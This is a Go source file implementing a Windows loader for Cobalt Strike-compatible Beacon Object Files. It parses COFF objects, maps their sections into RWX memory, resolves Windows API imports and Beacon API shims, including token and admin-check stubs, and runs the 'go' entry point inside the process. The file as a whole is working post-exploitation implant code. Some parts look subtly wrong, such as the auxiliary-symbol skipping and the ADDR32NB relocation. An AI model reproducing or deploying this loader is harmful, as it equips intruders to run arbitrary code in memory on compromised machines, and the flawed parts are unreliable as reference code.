//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── COFF / BOF Loader ──────────────────────────────────────────────────────
//
// Loads a Cobalt Strike–compatible Beacon Object File (BOF).
// BOFs are COFF object files compiled with MSVC or clang-cl.
// The loader:
//   1. Parses COFF headers and section table
//   2. Allocates RWX memory for each section
//   3. Resolves external symbols (Windows API + Beacon API shims)
//   4. Applies relocations (IMAGE_REL_AMD64_*)
//   5. Calls the exported "go" function with packed argument data

const (
	IMAGE_FILE_MACHINE_AMD64 = 0x8664

	// Relocation types (x64)
	IMAGE_REL_AMD64_ADDR64  = 0x0001
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32   = 0x0004
	IMAGE_REL_AMD64_REL32_1 = 0x0005
	IMAGE_REL_AMD64_REL32_4 = 0x0008
	IMAGE_REL_AMD64_REL32_5 = 0x0009

	// Section characteristics
	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000
)

type coffFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

// coffSymbol is the 18-byte COFF symbol table entry.
type coffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

// bofOutput collects output from BeaconOutput/BeaconPrintf callbacks.
var bofOutput bytes.Buffer

// LoadBOF loads and executes a BOF from raw COFF bytes, with optional packed args.
// args should be formatted as a packed datap buffer (little-endian length-prefixed fields).
func loadBOF(coff []byte, args []byte) (string, error) {
	bofOutput.Reset()
	r := bytes.NewReader(coff)

	// ── 1. Parse file header ─────────────────────────────────────────────────
	var fh coffFileHeader
	if err := binary.Read(r, binary.LittleEndian, &fh); err != nil {
		return "", fmt.Errorf("COFF header: %w", err)
	}
	if fh.Machine != IMAGE_FILE_MACHINE_AMD64 {
		return "", fmt.Errorf("unsupported machine 0x%X (need AMD64)", fh.Machine)
	}

	// Skip optional header (always 0 for object files, but just in case)
	if fh.SizeOfOptionalHeader > 0 {
		r.Seek(int64(fh.SizeOfOptionalHeader), 1)
	}

	// ── 2. Read section headers ───────────────────────────────────────────────
	sections := make([]coffSectionHeader, fh.NumberOfSections)
	for i := range sections {
		if err := binary.Read(r, binary.LittleEndian, &sections[i]); err != nil {
			return "", fmt.Errorf("section[%d]: %w", i, err)
		}
	}

	// ── 3. Read symbol table ──────────────────────────────────────────────────
	symbols := make([]coffSymbol, fh.NumberOfSymbols)
	symOff := int64(fh.PointerToSymbolTable)
	savedPos, _ := r.Seek(0, 1)
	r.Seek(symOff, 0)
	for i := range symbols {
		if err := binary.Read(r, binary.LittleEndian, &symbols[i]); err != nil {
			return "", fmt.Errorf("symbol[%d]: %w", i, err)
		}
		// Skip auxiliary symbol records
		if symbols[i].NumberOfAuxSymbols > 0 {
			r.Seek(int64(symbols[i].NumberOfAuxSymbols)*18, 1)
			i += int(symbols[i].NumberOfAuxSymbols)
		}
	}

	// Read string table (immediately after symbol table)
	var strTableSize uint32
	binary.Read(r, binary.LittleEndian, &strTableSize)
	strTable := make([]byte, strTableSize)
	if strTableSize > 4 {
		r.Read(strTable[4:])
	}
	r.Seek(savedPos, 0)

	// Helper: resolve COFF symbol name
	symName := func(s coffSymbol) string {
		if s.Name[0] == 0 && s.Name[1] == 0 && s.Name[2] == 0 && s.Name[3] == 0 {
			offset := binary.LittleEndian.Uint32(s.Name[4:])
			if int(offset) < len(strTable) {
				end := bytes.IndexByte(strTable[offset:], 0)
				if end < 0 {
					return string(strTable[offset:])
				}
				return string(strTable[offset : int(offset)+end])
			}
		}
		end := bytes.IndexByte(s.Name[:], 0)
		if end < 0 {
			end = 8
		}
		return string(s.Name[:end])
	}

	// ── 4. Allocate and populate sections ────────────────────────────────────
	sectionMem := make([]uintptr, len(sections))
	for i, sh := range sections {
		size := uintptr(sh.SizeOfRawData)
		if size == 0 {
			continue
		}
		mem, err := windows.VirtualAlloc(0, size,
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			return "", fmt.Errorf("VirtualAlloc section[%d]: %w", i, err)
		}
		sectionMem[i] = mem
		if sh.PointerToRawData > 0 && int(sh.PointerToRawData+sh.SizeOfRawData) <= len(coff) {
			copy((*[1 << 30]byte)(unsafe.Pointer(mem))[:size], coff[sh.PointerToRawData:])
		}
	}

	// ── 5. Build Beacon API shim table ───────────────────────────────────────
	beaconAPI := buildBeaconAPITable()

	// ── 6. Resolve all external symbol addresses ──────────────────────────────
	symAddrs := make([]uintptr, len(symbols))
	for i, sym := range symbols {
		name := symName(sym)
		if sym.SectionNumber > 0 {
			secIdx := int(sym.SectionNumber) - 1
			if secIdx < len(sectionMem) {
				symAddrs[i] = sectionMem[secIdx] + uintptr(sym.Value)
			}
			continue
		}
		if sym.SectionNumber == 0 && sym.StorageClass == 2 {
			// External symbol — look up in API tables
			addr := resolveExternalSym(name, beaconAPI)
			symAddrs[i] = addr
		}
	}

	// ── 7. Apply relocations ──────────────────────────────────────────────────
	for secIdx, sh := range sections {
		if sh.NumberOfRelocations == 0 || sectionMem[secIdx] == 0 {
			continue
		}
		relOff := int(sh.PointerToRelocations)
		for j := 0; j < int(sh.NumberOfRelocations); j++ {
			off := relOff + j*10
			if off+10 > len(coff) {
				break
			}
			rel := coffRelocation{
				VirtualAddress:   binary.LittleEndian.Uint32(coff[off:]),
				SymbolTableIndex: binary.LittleEndian.Uint32(coff[off+4:]),
				Type:             binary.LittleEndian.Uint16(coff[off+8:]),
			}
			if int(rel.SymbolTableIndex) >= len(symAddrs) {
				continue
			}
			symAddr := symAddrs[rel.SymbolTableIndex]
			patchSite := sectionMem[secIdx] + uintptr(rel.VirtualAddress)

			switch rel.Type {
			case IMAGE_REL_AMD64_ADDR64:
				val := uint64(symAddr)
				*(*uint64)(unsafe.Pointer(patchSite)) += val

			case IMAGE_REL_AMD64_ADDR32NB:
				// 32-bit RVA from image base (relative to patchSite for COFF)
				addend := int32(*(*int32)(unsafe.Pointer(patchSite)))
				rel32 := int32(int64(symAddr)+int64(addend)) - int32(patchSite+4)
				*(*int32)(unsafe.Pointer(patchSite)) = rel32

			case IMAGE_REL_AMD64_REL32,
				IMAGE_REL_AMD64_REL32_1,
				IMAGE_REL_AMD64_REL32_4,
				IMAGE_REL_AMD64_REL32_5:
				addend := int32(*(*int32)(unsafe.Pointer(patchSite)))
				bias := int32(rel.Type - IMAGE_REL_AMD64_REL32)
				rel32 := int32(int64(symAddr)+int64(addend)) - int32(patchSite+4) - bias
				*(*int32)(unsafe.Pointer(patchSite)) = rel32
			}
		}
	}

	// ── 8. Find and call go() ─────────────────────────────────────────────────
	var goFn uintptr
	for i, sym := range symbols {
		name := symName(sym)
		if name == "go" && sym.SectionNumber > 0 {
			goFn = symAddrs[i]
			break
		}
	}
	if goFn == 0 {
		// Clean up
		for _, m := range sectionMem {
			if m != 0 {
				windows.VirtualFree(m, 0, windows.MEM_RELEASE)
			}
		}
		return "", fmt.Errorf("BOF: 'go' entry point not found")
	}

	// Build datap for args
	argPtr, argLen := uintptr(0), int32(0)
	if len(args) > 0 {
		argMem, _ := windows.VirtualAlloc(0, uintptr(len(args)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		copy((*[1 << 30]byte)(unsafe.Pointer(argMem))[:len(args)], args)
		argPtr = argMem
		argLen = int32(len(args))
		defer windows.VirtualFree(argMem, 0, windows.MEM_RELEASE)
	}

	// Call: void go(char* args, int len)
	syscall.SyscallN(goFn, argPtr, uintptr(argLen))

	// Clean up sections
	for _, m := range sectionMem {
		if m != 0 {
			windows.VirtualFree(m, 0, windows.MEM_RELEASE)
		}
	}

	result := bofOutput.String()
	if result == "" {
		result = "[+] BOF executed (no output)"
	}
	return result, nil
}

// buildBeaconAPITable creates syscall.NewCallback stubs for each Beacon API function.
// Returns a map of symbol name → callback address.
func buildBeaconAPITable() map[string]uintptr {
	m := make(map[string]uintptr)

	// BeaconOutput(int type, char* data, int len)
	m["BeaconOutput"] = syscall.NewCallback(func(outputType int32, data uintptr, length int32) uintptr {
		if data != 0 && length > 0 {
			b := make([]byte, length)
			for i := range b {
				b[i] = *(*byte)(unsafe.Pointer(data + uintptr(i)))
			}
			bofOutput.Write(b)
		}
		return 0
	})

	// BeaconPrintf(int type, char* fmt, ...) — simplified: treat fmt as literal string
	m["BeaconPrintf"] = syscall.NewCallback(func(outputType int32, format uintptr, _ uintptr) uintptr {
		if format != 0 {
			// Read null-terminated string
			var sb strings.Builder
			for p := format; ; p++ {
				c := *(*byte)(unsafe.Pointer(p))
				if c == 0 {
					break
				}
				sb.WriteByte(c)
			}
			bofOutput.WriteString(sb.String())
		}
		return 0
	})

	// datap layout: [original uintptr][buffer uintptr][length int32][size int32]
	// BeaconDataParse(datap* parser, char* buffer, int size)
	m["BeaconDataParse"] = syscall.NewCallback(func(parser, buffer uintptr, size int32) uintptr {
		if parser != 0 {
			*(*uintptr)(unsafe.Pointer(parser))    = buffer
			*(*uintptr)(unsafe.Pointer(parser + 8)) = buffer
			*(*int32)(unsafe.Pointer(parser + 16))  = 0
			*(*int32)(unsafe.Pointer(parser + 20))  = size
		}
		return 0
	})

	// BeaconDataInt(datap* parser) -> int32
	m["BeaconDataInt"] = syscall.NewCallback(func(parser uintptr) uintptr {
		if parser == 0 {
			return 0
		}
		buf    := *(*uintptr)(unsafe.Pointer(parser + 8))
		length := *(*int32)(unsafe.Pointer(parser + 16))
		size   := *(*int32)(unsafe.Pointer(parser + 20))
		if size-length < 4 {
			return 0
		}
		val := binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(buf + uintptr(length)))[:])
		*(*int32)(unsafe.Pointer(parser + 16)) = length + 4
		return uintptr(val)
	})

	// BeaconDataShort(datap* parser) -> int16
	m["BeaconDataShort"] = syscall.NewCallback(func(parser uintptr) uintptr {
		if parser == 0 {
			return 0
		}
		buf    := *(*uintptr)(unsafe.Pointer(parser + 8))
		length := *(*int32)(unsafe.Pointer(parser + 16))
		size   := *(*int32)(unsafe.Pointer(parser + 20))
		if size-length < 2 {
			return 0
		}
		val := binary.LittleEndian.Uint16((*[2]byte)(unsafe.Pointer(buf + uintptr(length)))[:])
		*(*int32)(unsafe.Pointer(parser + 16)) = length + 2
		return uintptr(val)
	})

	// BeaconDataLength(datap* parser) -> int
	m["BeaconDataLength"] = syscall.NewCallback(func(parser uintptr) uintptr {
		if parser == 0 {
			return 0
		}
		length := *(*int32)(unsafe.Pointer(parser + 16))
		size   := *(*int32)(unsafe.Pointer(parser + 20))
		return uintptr(size - length)
	})

	// BeaconDataExtract(datap* parser, int* size) -> char*
	m["BeaconDataExtract"] = syscall.NewCallback(func(parser, sizePtr uintptr) uintptr {
		if parser == 0 {
			return 0
		}
		buf    := *(*uintptr)(unsafe.Pointer(parser + 8))
		length := *(*int32)(unsafe.Pointer(parser + 16))
		size   := *(*int32)(unsafe.Pointer(parser + 20))
		if size-length < 4 {
			return 0
		}
		fieldLen := int32(binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(buf + uintptr(length)))[:]))
		*(*int32)(unsafe.Pointer(parser + 16)) = length + 4 + fieldLen
		if sizePtr != 0 {
			*(*int32)(unsafe.Pointer(sizePtr)) = fieldLen
		}
		return buf + uintptr(length) + 4
	})

	// BeaconIsAdmin() -> BOOL
	m["BeaconIsAdmin"] = syscall.NewCallback(func() uintptr {
		tok, err := windows.OpenCurrentProcessToken()
		if err != nil {
			return 0
		}
		defer tok.Close()
		if tok.IsElevated() {
			return 1
		}
		return 0
	})

	// BeaconGetSpawnTo(x86 bool, buffer char*, length int) — stub (returns 0)
	m["BeaconGetSpawnTo"] = syscall.NewCallback(func(x86 uintptr, buf uintptr, length int32) uintptr {
		return 0
	})

	// BeaconUseToken(HANDLE token) — stub
	m["BeaconUseToken"] = syscall.NewCallback(func(token uintptr) uintptr {
		return 1
	})

	// BeaconRevertToken() — stub
	m["BeaconRevertToken"] = syscall.NewCallback(func() uintptr {
		return 0
	})

	return m
}

// resolveExternalSym resolves a COFF external symbol name to a callable address.
// Handles both __imp__BeaconXxx Beacon API symbols and __imp__DLL$Function imports.
func resolveExternalSym(name string, beaconAPI map[string]uintptr) uintptr {
	// Strip leading underscores and __imp__ prefix
	clean := name
	for strings.HasPrefix(clean, "_") {
		clean = clean[1:]
	}
	if strings.HasPrefix(clean, "imp_") {
		clean = clean[4:]
	}
	if strings.HasPrefix(clean, "_imp__") {
		clean = clean[6:]
	}
	if strings.HasPrefix(clean, "imp__") {
		clean = clean[5:]
	}
	if strings.HasPrefix(clean, "__imp__") {
		clean = clean[7:]
	}

	// Check Beacon API table
	if addr, ok := beaconAPI[clean]; ok {
		return addr
	}

	// Resolve Windows API: "KERNEL32$CreateFile" → GetProcAddress("CreateFile")
	if idx := strings.Index(clean, "$"); idx >= 0 {
		dllName := clean[:idx] + ".dll"
		funcName := clean[idx+1:]
		dll := windows.NewLazySystemDLL(dllName)
		proc := dll.NewProc(funcName)
		if err := proc.Find(); err == nil {
			return proc.Addr()
		}
	}

	// Try as plain Windows API name
	for _, dllName := range []string{"kernel32.dll", "ntdll.dll", "advapi32.dll", "user32.dll", "ws2_32.dll"} {
		dll := windows.NewLazySystemDLL(dllName)
		proc := dll.NewProc(clean)
		if err := proc.Find(); err == nil {
			return proc.Addr()
		}
	}

	return 0
}

// PackBOFArgs packs arguments into the datap binary format that BOFs expect.
// Usage: PackBOFArgs("s", "hello") or PackBOFArgs("iz", 42, "world")
// Type codes: s=string, z=wstring, i=int32, b=bytes
func PackBOFArgs(args ...interface{}) []byte {
	var buf bytes.Buffer
	for _, arg := range args {
		switch v := arg.(type) {
		case string:
			// Length-prefixed UTF-8 string
			b := append([]byte(v), 0)
			lb := make([]byte, 4)
			binary.LittleEndian.PutUint32(lb, uint32(len(b)))
			buf.Write(lb)
			buf.Write(b)
		case int32:
			lb := make([]byte, 4)
			binary.LittleEndian.PutUint32(lb, uint32(v))
			buf.Write(lb)
		case int:
			lb := make([]byte, 4)
			binary.LittleEndian.PutUint32(lb, uint32(v))
			buf.Write(lb)
		case int16:
			lb := make([]byte, 2)
			binary.LittleEndian.PutUint16(lb, uint16(v))
			buf.Write(lb)
		case []byte:
			lb := make([]byte, 4)
			binary.LittleEndian.PutUint32(lb, uint32(len(v)))
			buf.Write(lb)
			buf.Write(v)
		}
	}
	return buf.Bytes()
}
